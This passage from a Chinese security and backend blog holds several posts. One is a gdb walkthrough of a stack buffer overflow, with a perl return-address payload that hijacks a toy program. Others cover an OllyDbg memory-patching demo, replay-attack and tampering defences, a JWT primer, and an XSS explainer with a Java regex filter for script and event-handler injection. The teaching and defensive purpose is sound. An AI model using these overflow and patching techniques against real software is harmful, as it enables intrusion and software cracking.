可以看到寄存器中已经有14个A的ASCII码值41了，除此之外，还可以看到call指令下面的指令地址0x080484a9也在寄存器中了,我们要做的就是覆盖这个地址，只要将这个地址修改为hello函数所在的地址，那么程序就会 执行hello函数。通过观察发现，要用A覆盖满底下的寄存器数据，还需要12个A，也就是总共需要26个A才能全部覆盖。在命令行中输入26个A重新运行，然后再次到达13行断点位置，查看寄存器内容。123456789101112131415(gdb) r `perl -e 'print "A"x26'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/桌面/main `perl -e 'print "A"x26'`Breakpoint 2, main (argc=2, argv=0xffffd074) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd200 "\027") at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf80: 0xffffffff 0x4141002f 0x41414141 0x414141410xffffcf90: 0x41414141 0x41414141 0x41414141 0x41414141(gdb) 可以看到26个A已经把最后的数据全部覆盖了，我们要做的是让程序执行到hello函数，所以我们只需要22个A并且加上hello函数的首地址。通过调试可知hello函数的首地址是0x0804843b,我们使用perl对地址进行格式化输出，需要将这个16进制地址由后向前每两位进行一个\x拼接，得到的内容是 \x3b\x84\x04\x08。 在命令行中输入22个A加上hello函数地址重新运行,一路输入n单步运行。12345678910111213141516171819202122232425(gdb) r `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/桌面/main `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`Breakpoint 2, main (argc=2, argv=0xffffd074) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd200 "\027") at main.c:1313 printf("%s\n", buf);(gdb) nAAAAAAAAAAAAAAAAAAAAAA;�14 return 0;(gdb) n15 &#125;(gdb) nhello () at main.c:55 &#123;(gdb) n6 printf("hello\n");(gdb) nhello7 &#125;(gdb) n 可以看到上面的程序已经执行到hello函数了，我们可以输入q命令退出调试。 为了验证缓冲区溢出漏洞，我们现在直接运行程序，后面跟上我们之前调试分析时得到的结论数据进行运行。1234lanshiqin@lanshiqin-Parallels-Virtual-Platform:~/桌面$ ./main `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`AAAAAAAAAAAAAAAAAAAAAA;�hello段错误 (核心已转储) 可以看到程序调用了hello函数，并且成功输出了hello。虽然最后提示程序段错误，但是我们已经成功的通过让程序接收数据的缓冲区溢出，改变了程序的执行逻辑，执行了其他函数。 如果这是个具有网络通信功能的程序，通过缓冲区漏洞可以使攻击者远程执行任意代码，得到目标系统的控制权。缓冲区溢出攻击成为远程攻击的主要手段，攻击者通过目标ip地址扫描计算机的开放的端口，并对端口程序进行缓冲区溢出攻击，如果这个端口的程序存在缓冲区漏洞，那么这台计算机将会被攻陷。 防范部分：现代操作系统对缓冲区溢出攻击做了防范，比如ASLR(地址空间布局随机化),是参与保护缓冲区溢出问题的一个计算机安全技术。是为了防止攻击者在内存中能够可靠地对跳转到特定利用函数。ASLR包括随机排列程序的关键数据区域的位置，包括可执行的部分、堆、栈及共享库的位置。 缓冲区溢出普遍存在于旧版系统等程序上，比如Windows xp的pop3服务就存在缓存区溢出漏洞，通过该漏洞可以注入shellocode,拿到控制权进行任意操作，比如开启3389端口添加用户等操作，随后就可以通过添加的用户进行远程登录，Windows XP 系统目前在国内的学校和一些政府机构依然在使用，下一个实验内容我将会记录如何通过缓冲区溢出漏洞 远程入侵操作系统。]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World 的漏洞]]></title>
    <url>%2Fd7e81382%2F</url>
    <content type="text"><![CDATA[任何程序都有漏洞，包括简单的 Hello World程序，这是一个客观存在的事实。也许你会质疑，一个用C/C++语言编写的输出一句 Hello World 的程序漏洞在哪里？实际上，程序漏洞不一定全部都来自代码逻辑，漏洞还发生在程序运行时期。通过技术手段干扰程序执行，使程序不能得到预期的执行结果，那么这个程序就出现了漏洞。 分析者在没有程序源代码的情况下，只能通过逆分析程序的漏洞，常规操作通常是找到程序的入口点，进一步跟踪程序的调用逻辑和数据，通过修改其中的调用或者数据，使程序出现漏洞。 要做的事： 用C/C++编写一个输出”Hello,World!”的可执行的exe程序。 在程序运行期间修改内存中的数据，使程序输出 “Hi,lanshiqin” 使用的工具： VisualStudio Ollydbg 为了减小篇幅，不再啰嗦怎么创建项目，直接上代码经典的 Hello，World！源代码如下：123456789#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char* argv)&#123; printf("Hello,World!\n"); system("pause"); return 0;&#125; 将程序编译成可执行程序 HelloWorld.exe 并运行可以看到程序按源代码所编写的语句执行，得到了预期的输出结果。 也许有人会问，我直接修改程序的源代码，然后再编译成可执行程序运行，就可以得到想要的输出结果了，为什么要用反汇编工具调试这么麻烦？ 因为我们日常使用的绝大多数软件都是软件公司或者其他个人开发者的产品，我们不是这些软件的开发者，所以我们没有这些软件的源代码，所以只能通过逆向来对程序进行分析。在互联网上我们可以看到有很多正版的收费软件有对应的破解版，这些破解版软件就是有人通过逆向找到程序入口并修改其中的数据，通过程序逻辑漏洞或者运行时期的漏洞对软件进行破解。 一个程序要被CPU执行，首先需要先被载入内存中，我们想要达到修改程序的预期输出结果，就需要找到这块内存并修改其中的数据，以达到我们的目的。 逆向工具在Windows平台的逆向领域中，有两个很好用的工具，一个是Ollydbg(简称OD),经常用来做动态调试，另一个是IDA 经常被用来静态分析。OD用来调试运行时期的程序，可以将CPU执行的机器指令反成汇编指令，可以实时断点查看当前执行的指令，这对分析一些病毒的行为很有用，可以细微到每一条指令的调用，分析出程序具体做了什么。IDA 主要用来分析复杂的代码，通过可执行程序可以得到伪代码，对于一些高级语言编写的程序甚至可以得到近似于程序的源代码，这样就很方便去查找程序里的逻辑漏洞。OD和IDA这两个工具是逆向领域的倚天剑和屠龙刀，具体介绍和功能使用可以查阅相关文档。 操作步骤1.使用OD来打开HelloWorld.exe此时程序还没执行到输出“Hello，World！”的语句，此时是程序刚刚被载入内存，OD界面上可以看到程序当前执行的指令 2.组合键 Alt+M，打开 Memory map 窗口，这是程序运行时的内存数据 3.组合键 Ctrl+B, 搜索内存中的数据ASCII码这里输入要需要替换的“Hello,World!”,底下HEX+00这里是对应ASCII码字符的十六进制数据。 4.点击搜索，可以看到如下图所示，已经搜索到了数据。可以看到对应的内存地址，HEX dump 和ASCII 5.组合键Ctrl+E, 或者点击Edit-&gt;Binary edit 对内存数据进行编辑将ASCII码的“Hello,World!”修改成“Hi,lanshiqin”，点击OK 6.继续运行程序，可以看到控制台输出了 “Hi,lanshiqin”。通过修改程序运行时的内存数据，我们已经成功的改变了程序的预期结果。 通过运行时调试只能影响程序当前运行的结果，如果要影响每次运行的结果，我们可以将此次修改的指令和数据保存成新的可执行程序，以补丁包的形式附加成一个目标程序。（在没有程序源代码的情况下，这种做法相当于达到软件破解的目的，这个补丁相当于破解补丁，功能是使程序输出Hi,lanshiqin） 现在已经证实了，所有程序都有漏洞，包括仅仅是输出一句 “Hello,World!”的程序。 所以，很多程序为了防止被破解，通常都使用了代码混淆，程序加壳等保护措施。这些措施可以加大程序被破解的难度，但是仍然存在漏洞。代码混淆后编译使分析者很难读懂代码，程序加壳主要是为了程序的保护，防止分析者找到程序的入口点。 对于代码混淆，可以在一定程度上防止自己的程序被人还原出源代码，目前的APP应用程序，通常是为了防止应用被抄袭，这点混淆就很有用，因为分析者花费大量精力来分析还原出一个程序的工作量，都可以够他重新写出好几个新的程序了。但是混淆后程序行为依然可以被轻易的分析，所有的程序运行时都需要先被载入内存，然后被CPU执行，分析者可以通过CPU的执行指令进行调试分析，可以对运行时的内存进行分析，进一步修改内存数据，达到破解目的，比如这是个木马APP,安全人员可以跟踪这个程序，分析出这个程序究竟做了什么。 对于程序加壳，通常可以去壳，然后再找程序的入口点。程序的启动过程和入口点是一个比较大的话题，通过C/C++编写的 Hello World 程序逆向分析发现， 程序的入口点并不是main()函数。教科书为了易于理解，通常都告诉我们程序的入口点是main()函数，这是在代码逻辑的角度看。如果从程序执行的角度来看，程序的入口点并不是main()函数。入口点其实是一个地址。入口点地址不是main()函数的开端，而是另一段来自运行时的代码。通过前面的OD分析HelloWorld.exe可执行程序，我们发现程序并不是从Main函数开始执行的，教科书上所谓的“入口地址Main函数“其实也是一个参数，需要被别人调用。对于逆向寻找程序入口点 不再记录笔记，因为已经有人写了很好的文章：https://bbs.pediy.com/thread-216976.htm使用VisualStudio断点调试HelloWorld的源代码在调用堆栈窗口可以看到函数调用关系，打开mainCRTStartup，可以看到如下图所示：可以发现有这么一句赋值语句，mainret = main(argc, argv, envp);main函数作为参数赋值给了mainret变量。在微软的Windows操作系统上，可执行程序c中提供了mainCRTStartup(）运行配置函数，里面包含了程序运行需要的库以及相关的存储资源，在配置完成后，调用 mainret = main(argc, argv, envp); 这条语句所以main并不是程序的入口，main只是作为普通的函数。 计算机程序最终都需要在计算机上运行，程序本身可能存在逻辑漏洞，执行程序的计算机硬件也存在被干扰的可能。我们对程序的定义是：程序是可以被计算机执行的指令集合。从虚拟的数学逻辑到现实的物理化学，我们可以通过一切已知的工具和未知的技术手段去寻找程序的漏洞，所以受外界条件的影响，任何程序都有漏洞，程序漏洞永远存在。]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[API接口防止参数篡改和重放攻击]]></title>
    <url>%2Fef4382ec%2F</url>
    <content type="text"><![CDATA[API重放攻击（Replay Attacks）又称重播攻击、回放攻击。他的原理就是把之前窃听到的数据原封不动的重新发送给接收方。HTTPS并不能防止这种攻击，虽然传输的数据是经过加密的，窃听者无法得到数据的准确定义，但是可以从请求的接收方地址分析出这些数据的作用。比如用户登录请求时攻击者虽然无法窃听密码，但是却可以截取加密后的口令然后将其重放，从而利用这种方式进行有效的攻击。 所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，重放攻击是计算机世界黑客常用的攻击方式之一。 一次HTTP请求，从请求方到接收方中间要经过很多个路由器和交换机，攻击者可以在中途截获请求的数据。假设在一个网上存款系统中，一条消息表示用户支取了一笔存款，攻击者完全可以多次发送这条消息而偷窃存款。 重放是二次请求，如果API接口没有做对应的安全防护，将可能造成很严重的后果。 API接口常见的安全防护要做的主要有如下几点： 防止sql注入 防止xss攻击 防止请求参数被串改 防止重放攻击 主要防御措施可以归纳为两点： 对请求的合法性进行校验 对请求的数据进行校验 防止重放攻击必须要保证请求仅一次有效需要通过在请求体中携带当前请求的唯一标识，并且进行签名防止被篡改。所以防止重放攻击需要建立在防止签名被串改的基础之上。 请求参数防篡改采用https协议可以将传输的明文进行加密，但是黑客仍然可以截获传输的数据包，进一步伪造请求进行重放攻击。如果黑客使用特殊手段让请求方设备使用了伪造的证书进行通信，那么https加密的内容也将会被解密。在API接口中我们除了使用https协议进行通信外，还需要有自己的一套加解密机制，对请求参数进行保护，防止被篡改。过程如下： 客户端使用约定好的秘钥对传输参数进行加密，得到签名值signature，并且将签名值也放入请求参数中，发送请求给服务端 服务端接收客户端的请求，然后使用约定好的秘钥对请求的参数（除了signature以外）再次进行签名，得到签名值autograph。 服务端对比signature和autograph的值，如果对比一致，认定为合法请求。如果对比不一致，说明参数被篡改，认定为非法请求。 因为黑客不知道签名的秘钥，所以即使截取到请求数据，对请求参数进行篡改，但是却无法对参数进行签名，无法得到修改后参数的签名值signature。签名的秘钥我们可以使用很多方案，可以采用对称加密或者非对称加密。 防止重放攻击基于timestamp的方案每次HTTP请求，都需要加上timestamp参数，然后把timestamp和其他参数一起进行数字签名。因为一次正常的HTTP请求，从发出到达服务器一般都不会超过60s，所以服务器收到HTTP请求之后，首先判断时间戳参数与当前时间相比较，是否超过了60s，如果超过了则认为是非法的请求。 一般情况下，黑客从抓包重放请求耗时远远超过了60s，所以此时请求中的timestamp参数已经失效了。如果黑客修改timestamp参数为当前的时间戳，则signature参数对应的数字签名就会失效，因为黑客不知道签名秘钥，没有办法生成新的数字签名。 但这种方式的漏洞也是显而易见的，如果在60s之后进行重放攻击，那就没办法了，所以这种方式不能保证请求仅一次有效。 基于nonce的方案nonce的意思是仅一次有效的随机字符串，要求每次请求时，该参数要保证不同，所以该参数一般与时间戳有关，我们这里为了方便起见，直接使用时间戳的16进制，实际使用时可以加上客户端的ip地址，mac地址等信息做个哈希之后，作为nonce参数。我们将每次请求的nonce参数存储到一个“集合”中，可以json格式存储到数据库或缓存中。每次处理HTTP请求时，首先判断该请求的nonce参数是否在该“集合”中，如果存在则认为是非法请求。 nonce参数在首次请求时，已经被存储到了服务器上的“集合”中，再次发送请求会被识别并拒绝。nonce参数作为数字签名的一部分，是无法篡改的，因为黑客不清楚token，所以不能生成新的sign。 这种方式也有很大的问题，那就是存储nonce参数的“集合”会越来越大，验证nonce是否存在“集合”中的耗时会越来越长。我们不能让nonce“集合”无限大，所以需要定期清理该“集合”，但是一旦该“集合”被清理，我们就无法验证被清理了的nonce参数了。也就是说，假设该“集合”平均1天清理一次的话，我们抓取到的该url，虽然当时无法进行重放攻击，但是我们还是可以每隔一天进行一次重放攻击的。而且存储24小时内，所有请求的“nonce”参数，也是一笔不小的开销。 基于timestamp和nonce的方案nonce的一次性可以解决timestamp参数60s的问题，timestamp可以解决nonce参数“集合”越来越大的问题。防止重放攻击一般和防止请求参数被串改一起做，请求的Headers数据如下图所示。 我们在timestamp方案的基础上，加上nonce参数，因为timstamp参数对于超过60s的请求，都认为非法请求，所以我们只需要存储60s的nonce参数的“集合”即可。API接口验证流程：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 获取tokenString token = request.getHeader("token");// 获取时间戳String timestamp = request.getHeader("timestamp");// 获取随机字符串String nonceStr = request.getHeader("nonceStr");// 获取请求地址String url = request.getHeader("url");// 获取签名String signature = request.getHeader("signature");// 判断参数是否为空if (StringUtils.isBlank(token) || StringUtils.isBlank(timestamp) || StringUtils.isBlank(nonceStr) || StringUtils.isBlank(url) || StringUtils.isBlank(signature)) &#123; //非法请求 return;&#125;//验证token有效性，得到用户信息UserTokenInfo userTokenInfo = TokenUtils.getUserTokenInfo(token);if (userTokenInfo == null) &#123; //token认证失败（防止token伪造） return;&#125;// 判断请求的url参数是否正确if (!request.getRequestURI().equals(url))&#123; //非法请求 (防止跨域攻击) return;&#125;// 判断时间是否大于60秒if(DateUtils.getSecond()-DateUtils.toSecond(timestamp)&gt;60)&#123; //请求超时(防止重放攻击) return;&#125;// 判断该用户的nonceStr参数是否已经在redis中if (RedisUtils.haveNonceStr(userTokenInfo,nonceStr))&#123; //请求仅一次有效（防止短时间内的重放攻击） return;&#125;// 对请求头参数进行签名String stringB = SignUtil.signature(token, timestamp, nonceStr, url,request);// 如果签名验证不通过if (!signature.equals(stringB)) &#123; //非法请求（防止请求参数被篡改） return;&#125;// 将本次用户请求的nonceStr参数存到redis中设置60秒后自动删除RedisUtils.saveNonceStr(userTokenInfo,nonceStr,60);//开始处理合法的请求 基于以上的方案就可以做到防止API接收的参数被篡改和防止API请求重放攻击。]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSON WEB TOKEN]]></title>
    <url>%2Fb2d6036c%2F</url>
    <content type="text"><![CDATA[Json web token (JWT) 是一种基于JSON的开放标准。为了在网络应用环境间传递声明，该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于身份认证。 1.基本概念 Token和Session的区别 基于Session的认证http协议是一种无状态协议，用户在登录时向服务端提供用户名和密码进行用户认证，下一次请求时，用户还要再一次进行用户认证才行，因为http协议是无状态的，服务器并不知道是哪个用户发出的请求。为了让服务端能识别是哪个用户发出的请求，服务端需要在用户登录时存储一份用户登录的信息，该信息由Session值来标识，服务端生成Session后将SessionId作为登录的响应数据传递给浏览器，让浏览器保存为cookie，方便下次请求时发送给服务端，这样服务器就能识别是来自哪个用户的请求了。 Session认证暴露的问题 资源开销：每个用户进行登录认证，服务端应用做一次记录，方便用户下次请求的鉴别，为了能够快速响应用户请求，通常需要把session保存在内存中，而随着认证用户的增加，服务端的开销会明显增大。 扩展性：用户登录认证记录被保存在当前服务端中，意味着用户下次请求还必须要在这台服务器上才能拿到授权的资源。随着用户并发的增大，web应用如果要扩展成分布式应用，采用session的认证将会变得很难扩展，虽然可以用redis来做分布式session共享，但是还是占用了相当大的内存开销。 CSRF：因为是基于cookie来进行用户识别的，如果cookie被截获，就会很容易受到跨站请求伪造的攻击。 基于Token的认证基于token的认证不需要在服务端保存用户的认证信息或者会话信息，该认证机制的应用不需要考虑用户在哪一台服务器登录，为应用的扩展提供了便利。 鉴权流程 客户端使用用户名和密码进行登录请求 服务端接收用户的登录请求，进行用户信息的认证 服务端为认证通过的用户生成token，在登录请求的响应体里返回给客户端 客户端存储登录时的token，并在每次请求服务端时附带上存储的token 服务端验证token值并返回数据。 这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持CORS(跨来源资源共享)策略，一般我们在服务端这么做就可以了Access-Control-Allow-Origin: *。 2. 基础知识JWT长什么样？以下是一段JWT字符串示例1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ.QzO3RdsVgG4MxikyFDXt55jIjnjAPF49vvPL_fUd_KQ JWT的结构JWT由以下三个部分组成 HEADER:（头部，生成算法和token类型，算法一般是，token类型这里是jwt） PAYLOAD: (有效载荷, 这里存放一些要传输的数据) VERIFY SIGNATURE （签名验证） 三个部分用符号 . 连接起来，构成了JWT字符串，格式如下所示1xxxxx.yyyyy.zzzzz headerjwt的头部承载两部分信息： 声明类型，这里是jwt 声明加密的算法 通常直接使用 HMAC SHA256完整的头部就像下面这样的JSON：1234&#123; "alg": "HS256", "typ": "JWT"&#125; 然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 playload载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分 标准中注册的声明 公共的声明 私有的声明标准中注册的声明 (建议但不强制使用) ： iss: jwt签发者 sub: jwt所面向的用户 aud: 接收jwt的一方 exp: jwt的过期时间，这个过期时间必须要大于签发时间 nbf: 定义在什么时间之前，该jwt都是不可用的. iat: jwt的签发时间 jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。 公共的声明 ：公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密. 私有的声明 ：私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。 定义一个payload:12345&#123; "sub": "1234567890", "name": "lanshiqin", "admin": true&#125; 然后将其进行base64加密，得到Jwt的第二部分。1eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ signaturejwt的第三部分是一个签证信息，这个签证信息由三部分组成： header (base64后的) payload (base64后的) secret这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。最终的JWT：1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ.QzO3RdsVgG4MxikyFDXt55jIjnjAPF49vvPL_fUd_KQ 注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。 如何应用一般是在请求头里加入Authorization，并加上Bearer标注：123headers: &#123; 'Authorization': 'Bearer ' + token &#125; 服务端会验证token，如果验证通过就会返回相应的资源。整个流程如下图所示： 总结 优点 因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。 因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。 便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。 它不需要在服务端保存会话信息, 所以它易于应用的扩展 安全相关 不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。 保护好secret私钥，该私钥非常重要。 如果可以，请使用https协议]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[什么是XSS攻击]]></title>
    <url>%2F4fa736d8%2F</url>
    <content type="text"><![CDATA[XSS攻击全称为跨站脚本攻击。XSS是一种在web应用中的计算机安全漏洞，允许攻击者将恶意代码植入到网页中，导致其他正常用户访问该网页时被攻击。XSS最常见的做法就是在提交表单中插入html或者js脚本来达到攻击目的。这种攻击在互联网发展初期是很常见的，百度贴吧和新浪微博曾经都有被XSS攻击过。引起XSS攻击的关键原因还是在于开发时编写的程序不够严谨，没有对xss进行过滤。 虽然XSS攻击从出现到现在已经年代久远，但是他所产生的危害不容小视。当前主流的框架已经为我们提供好并且封装了各种功能，对XSS攻击也可以用简单的配置来过滤掉。不过还是那句话，框架只是工具，关键在于使用工具的人。如果遇到比较坑的开发人员，就算使用这些做了安全过滤的框架 任然可能因为使用不当造成被攻击的可能。 之前遇到的一家第三方软件公司，他们非常抵触用框架来开发，全部用jsp来写web程序，就和大学课堂上教的编程基础课一样，没有考虑到安全问题，自然有各种漏洞，没有写过滤器对XSS进行过滤，可以很轻易的就被攻击。 下面是简单的XSS攻击实例，使用jsp来搭建一个简单的网站，没有对xss进行过滤，主要就两个页面1.查看信息列表页面2.添加文章信息页面 正常的用户输入文字内容，点击保存跳转回信息列表页面，即可在信息列表页面查看到刚刚输入的文章内容。如果是别有用心的攻击者，只需要输入html或者js即可完成注入。这里我们输入一个js脚本用来弹出对话框，并插入一个 a标签注入url链接。 点击保存后跳转到信息列表页面时，我们可以看到原本正常的页面变得不正常了，浏览器跳出了对话框，对话框内容就是我们刚刚输入的js弹出内容，并且可以看到新增记录的文章内容变成了一个可以点击跳转的链接，如果攻击者输入了一个带有钓鱼网站的链接，那么其他用户在访问这个网页的时候就会看到和现在页面一样的情况，如果点击了链接就有可能中招。 试着添加一条文章，内容里面写html标签，看看能否用iframe来插入一个网页点击保存，回到信息列表页面，发现文章内容被插入了一个网页 打开数据库，发现我们数据库直接存了用户提交的内容，没有进行任何转义处理。其他用户在查看信息列表页面时将查询出数据库的数据直接传给浏览器，浏览器会直接解释执行这些标签，给访问的用户造成危害。 我们应该添加一个Filter对用户输入的数据进行过滤新建一个SecurityFilter类继承自Filter类1234567891011121314151617181920212223242526272829303132333435363738394041package com.lanshiqin.student.filter;import javax.servlet.*;import javax.servlet.http.HttpServletRequest;import java.io.IOException;/** * 安全过滤器 * 可以在doFilter中添加多个过滤规则 */public class SecurityFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; /** * 过滤函数,可以添加多个规则 * * @param servletRequest 请求对象 * @param servletResponse 响应对象 * @param filterChain 过滤器链 * @throws IOException 异常信息 * @throws ServletException servlet异常信息 */ @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; // 过滤请求中的xss攻击 filterChain.doFilter(new XSSRequestWrapper((HttpServletRequest) servletRequest), servletResponse); // 过滤或拦截其他攻击 // ... &#125; @Override public void destroy() &#123; &#125;&#125; 新建一个XSSRequestWrapper类继承自HttpServletRequestWrapper类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150package com.lanshiqin.student.filter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletRequestWrapper;import java.util.regex.Pattern;/** * xss过滤规则包装类 */public class XSSRequestWrapper extends HttpServletRequestWrapper &#123; private HttpServletRequest orgRequest; // httpServlet请求对象 public XSSRequestWrapper(HttpServletRequest request) &#123; super(request); orgRequest = request; &#125; /** * 覆盖getParameter方法，将参数名和参数值都做xss &amp; sql过滤。 * 如果需要获得原始的值，则通过super.getParameterValues(name)来获取 * getParameterNames,getParameterValues和getParameterMap也可能需要覆盖 */ @Override public String getParameter(String name) &#123; String value = super.getParameter(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * 覆盖getHeader方法，将参数名和参数值都做xss &amp; sql过滤。 * 如果需要获得原始的值，则通过super.getHeaders(name)来获取 * getHeaderNames 也可能需要覆盖 */ @Override public String getHeader(String name) &#123; String value = super.getHeader(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * 将容易引起xss &amp; sql漏洞的半角字符直接替换成全角字符 * * @param s 请求数据 * @return 编码后的请求数据 */ private static String xssEncode(String s) &#123; if (s == null || s.isEmpty()) &#123; return s; &#125; else &#123; s = stripXSSAndSql(s); &#125; StringBuilder sb = new StringBuilder(s.length() + 16); for (int i = 0; i &lt; s.length(); i++) &#123; char c = s.charAt(i); switch (c) &#123; case '&gt;': sb.append("＞");// 转义大于号 break; case '&lt;': sb.append("＜");// 转义小于号 break; case '\'': sb.append("＇");// 转义单引号 break; case '\"': sb.append("＂");// 转义双引号 break; case '&amp;': sb.append("＆");// 转义&amp; break; case '#': sb.append("＃");// 转义# break; default: sb.append(c); break; &#125; &#125; return sb.toString(); &#125; /** * 获取最原始的request * * @return request */ public HttpServletRequest getOrgRequest() &#123; return orgRequest; &#125; /** * 获取最原始的request的静态方法 * 在装饰者设计模式下，除了过滤xss，可能还有多个过滤器包装类 * 提供静态方法方便继承该类的装饰者包装新的安全规则 * * @return request请求对象 */ public static HttpServletRequest getOrgRequest(HttpServletRequest req) &#123; if (req instanceof XSSRequestWrapper) &#123; return ((XSSRequestWrapper) req).getOrgRequest(); &#125; return req; &#125; /** * 防止xss跨脚本攻击（替换，根据实际情况调整） * 通过正则匹配敏感字符 */ public static String stripXSSAndSql(String value) &#123; if (value != null) &#123; // Avoid anything between script tags Pattern scriptPattern = Pattern.compile("&lt;[\r\n| | ]*script[\r\n| | ]*&gt;(.*?)&lt;/[\r\n| | ]*script[\r\n| | ]*&gt;", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid anything in a src="http://www.yihaomen.com/article/java/..." type of e-xpression scriptPattern = Pattern.compile("src[\r\n| | ]*=[\r\n| | ]*[\\\"|\\\'](.*?)[\\\"|\\\']", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Remove any lonesome &lt;/script&gt; tag scriptPattern = Pattern.compile("&lt;/[\r\n| | ]*script[\r\n| | ]*&gt;", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Remove any lonesome &lt;script ...&gt; tag scriptPattern = Pattern.compile("&lt;[\r\n| | ]*script(.*?)&gt;", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid eval(...) expressions scriptPattern = Pattern.compile("eval\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid e-xpression(...) expressions scriptPattern = Pattern.compile("e-xpression\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid javascript:... expressions scriptPattern = Pattern.compile("javascript[\r\n| | ]*:[\r\n| | ]*", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid vbscript:... expressions scriptPattern = Pattern.compile("vbscript[\r\n| | ]*:[\r\n| | ]*", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid onload= expressions scriptPattern = Pattern.compile("onload(.*?)=", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); &#125; return value; &#125;&#125; 在项目的web.xml中添加安全过滤器配置123456789101112131415161718&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" version="3.1"&gt; &lt;!--安全过滤器配置--&gt; &lt;filter&gt; &lt;filter-name&gt;securityFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.lanshiqin.student.filter.SecurityFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;securityFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; 